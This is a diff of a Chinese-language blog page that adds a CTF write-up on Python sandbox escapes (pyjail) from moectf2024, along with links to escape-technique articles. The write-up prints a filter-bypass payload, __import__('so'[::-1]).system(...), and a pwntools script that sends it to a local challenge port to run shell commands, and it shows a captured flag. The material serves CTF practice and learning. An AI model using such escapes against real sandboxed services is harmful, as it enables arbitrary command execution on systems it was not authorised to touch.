-var decryption_failure_message = "\u9519\u4e86\u54e6 ~ \u8fd8\u662f\u6765\u627e\u6211\u8981\u5bc6\u7801\u5427";
-var encryptcontent_keystore = ["v2K4p3YivCB5KPen/kh0nQ==;WxDWOt41v+rXIdc9+2nd1YThnQJc8c03mjP1/pPEH+jvGV7vqN2rMkv0BNfwSKs1tAGBHQbcba3YpsO2yTDp01SkcQr0lR0Hsvc1gL4/OGSchw0FeM7/iCGmffoO2Txf;kK0VGH7uQW8mDx5zuRF6Mg=="];
-var encryptcontent_obfuscate = 0;
-
-</script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/core.js" type="text/javascript"></script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/enc-base64.js" type="text/javascript"></script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/cipher-core.js" type="text/javascript"></script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/sha256.js" type="text/javascript"></script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/hmac.js" type="text/javascript"></script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/pbkdf2.js" type="text/javascript"></script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/aes.js" type="text/javascript"></script>
-<script defer="" src="../../../assets/javascripts/decrypt-contents.js" type="text/javascript"></script>
+<h1>pyjail</h1>
+<blockquote>
+<p>[!PREREQUISITE]</p>
+<p>准备练练<span><span class="heti-spacing"> </span>python jail</span> ，准备资料如下：</p>
+<ul>
+<li><a href="https://www.tr0y.wang/">Tr0y's Blog</a><ul>
+<li><a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"><span>Python<span class="heti-spacing"> </span></span>沙箱逃逸的经验总结</a></li>
+<li><a href="https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/"><span>Python<span class="heti-spacing"> </span></span>沙箱逃逸的通解探索之路</a></li>
+<li><a href="https://www.tr0y.wang/2020/08/18/IDN/#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span>Unicode<span class="heti-spacing"> </span></span>的使用</a></li>
+</ul>
+</li>
+<li><a href="https://www.nssctf.cn/problem"><span>nssctf<span class="heti-spacing"> </span></span></a><span>(<span class="heti-spacing"> </span></span>搜<span class="heti-skip"><span class="heti-spacing"> </span>jail<span class="heti-spacing"> </span></span>即可<span><span class="heti-spacing"> </span>)</span><ul>
+<li><a href="https://www.aiwin.fun/index.php/archives/3992/">一个简单的题解</a></li>
+</ul>
+</li>
+<li><a href="https://github.com/martcl/autojail">github-autojail</a></li>
+<li><a href="https://ctf.xidian.edu.cn/games/10/challenges?challenge=95"><span>moectf2024<span class="heti-spacing"> </span></span>题目链接</a></li>
+</ul>
+</blockquote>
+<h2 id="moectf2024">moectf2024<a class="headerlink" href="#moectf2024" title="Permanent link">¶</a></h2>
+<h3 id="moejail_lv1">moejail_lv1<a class="headerlink" href="#moejail_lv1" title="Permanent link">¶</a></h3>
+<p>根据要求拼接字符串后允许我们注入<span><span class="heti-spacing"> </span>payload</span>，简单尝试后发现 <code>__import__('so'[::-1]).system('ls')</code> 是可行的，将 <code>ls</code> 换为需要执行的语句即可。</p>
+<p>根据提示，在 <code>/tmp/</code> 下，<a href="../attachments/pyjail.png">注意使用 <code>ls -a</code> 显示全部</a>，之后想要查看文件，但是因为文件名导致命令太长了，使用 <code>*</code> 进行匹配即可：</p>
+<p><a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="80%" href="../attachments/pyjail-1.png"><img alt="" src="../attachments/pyjail-1.png"/></a></p>
+<blockquote>
+<p>[!FLAG]</p>
+<p>moectf{Ah_HA-nOW-Y0u_KNoW_H0w_T0_EsCApE-SIMpL3_5trlng_fILter0}</p>
+</blockquote>
+<h3 id="moejail_lv2">moejail_lv2<a class="headerlink" href="#moejail_lv2" title="Permanent link">¶</a></h3>
+<p>后面的系列题交互是类似的，故使用<span class="heti-skip"><span class="heti-spacing"> </span>python<span class="heti-spacing"> </span></span>交互吧：</p>
+<div class="highlight"><span class="filename">moejail.py</span><pre><span></span><code><a href="#__codelineno-0-1" id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<a href="#__codelineno-0-2" id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="kn">import</span> <span class="nn">re</span>
+<a href="#__codelineno-0-3" id="__codelineno-0-3" name="__codelineno-0-3"></a>
+<a href="#__codelineno-0-4" id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="c1"># 启用debug模式</span>
+<a href="#__codelineno-0-5" id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span>
+<a href="#__codelineno-0-6" id="__codelineno-0-6" name="__codelineno-0-6"></a>
+<a href="#__codelineno-0-7" id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="c1"># 建立连接</span>
+<a href="#__codelineno-0-8" id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"127.0.0.1"</span><span class="p">,</span> <span class="mi">51371</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+<a href="#__codelineno-0-9" id="__codelineno-0-9" name="__codelineno-0-9"></a>
+<a href="#__codelineno-0-10" id="__codelineno-0-10" name="__codelineno-0-10"></a><span class="c1"># 接收欢迎信息</span>
+<a href="#__codelineno-0-11" id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="n">welcome_msg</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"to continue:"</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+<a href="#__codelineno-0-12" id="__codelineno-0-12" name="__codelineno-0-12"></a><span class="c1"># print(welcome_msg)</span>
+<a href="#__codelineno-0-13" id="__codelineno-0-13" name="__codelineno-0-13"></a>
+<a href="#__codelineno-0-14" id="__codelineno-0-14" name="__codelineno-0-14"></a><span class="c1"># 使用正则表达式匹配需要拼接的字符串</span>
+<a href="#__codelineno-0-15" id="__codelineno-0-15" name="__codelineno-0-15"></a><span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">"Please enter '(\w+)'\+'(\w+)'=\? to continue:"</span><span class="p">,</span> <span class="n">welcome_msg</span><span class="p">)</span>
+<a href="#__codelineno-0-16" id="__codelineno-0-16" name="__codelineno-0-16"></a><span class="k">if</span> <span class="n">match</span><span class="p">:</span>
+<a href="#__codelineno-0-17" id="__codelineno-0-17" name="__codelineno-0-17"></a>    <span class="n">str1</span><span class="p">,</span> <span class="n">str2</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">groups</span><span class="p">()</span>
+<a href="#__codelineno-0-18" id="__codelineno-0-18" name="__codelineno-0-18"></a>    <span class="n">answer</span> <span class="o">=</span> <span class="n">str1</span> <span class="o">+</span> <span class="n">str2</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+<a href="#__codelineno-0-19" id="__codelineno-0-19" name="__codelineno-0-19"></a>    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">answer</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<a href="#__codelineno-0-20" id="__codelineno-0-20" name="__codelineno-0-20"></a><span class="k">else</span><span class="p">:</span>
+<a href="#__codelineno-0-21" id="__codelineno-0-21" name="__codelineno-0-21"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">"Failed to match the required strings"</span><span class="p">)</span>
+<a href="#__codelineno-0-22" id="__codelineno-0-22" name="__codelineno-0-22"></a>    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<a href="#__codelineno-0-23" id="__codelineno-0-23" name="__codelineno-0-23"></a>    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<a href="#__codelineno-0-24" id="__codelineno-0-24" name="__codelineno-0-24"></a>
+<a href="#__codelineno-0-25" id="__codelineno-0-25" name="__codelineno-0-25"></a><span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<a href="#__codelineno-0-26" id="__codelineno-0-26" name="__codelineno-0-26"></a>
+<a href="#__codelineno-0-27" id="__codelineno-0-27" name="__codelineno-0-27"></a><span class="n">command</span> <span class="o">=</span> <span class="s2">"__import__('so'[::-1]).system('ls')"</span>
+<a href="#__codelineno-0-28" id="__codelineno-0-28" name="__codelineno-0-28"></a>
+<a href="#__codelineno-0-29" id="__codelineno-0-29" name="__codelineno-0-29"></a><span class="nb">print</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+<a href="#__codelineno-0-30" id="__codelineno-0-30" name="__codelineno-0-30"></a><span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">command</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<a href="#__codelineno-0-31" id="__codelineno-0-31" name="__codelineno-0-31"></a>
+<a href="#__codelineno-0-32" id="__codelineno-0-32" name="__codelineno-0-32"></a><span class="c1"># 接收并打印所有输出</span>
+<a href="#__codelineno-0-33" id="__codelineno-0-33" name="__codelineno-0-33"></a><span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<a href="#__codelineno-0-34" id="__codelineno-0-34" name="__codelineno-0-34"></a>
+<a href="#__codelineno-0-35" id="__codelineno-0-35" name="__codelineno-0-35"></a><span class="c1"># 关闭连接</span>
+<a href="#__codelineno-0-36" id="__codelineno-0-36" name="__codelineno-0-36"></a><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+<p>我们只需要修改<span class="heti-skip"><span class="heti-spacing"> </span>command<span class="heti-spacing"> </span></span>即可。</p>
+<h3 id="readme">readme<a class="headerlink" href="#readme" title="Permanent link">¶</a></h3>
+<p>偶遇一个提示？(attachments/MISC.png)</p>
 <form class="md-feedback" hidden="" name="feedback">
 <fieldset>
 <legend class="md-feedback__title">
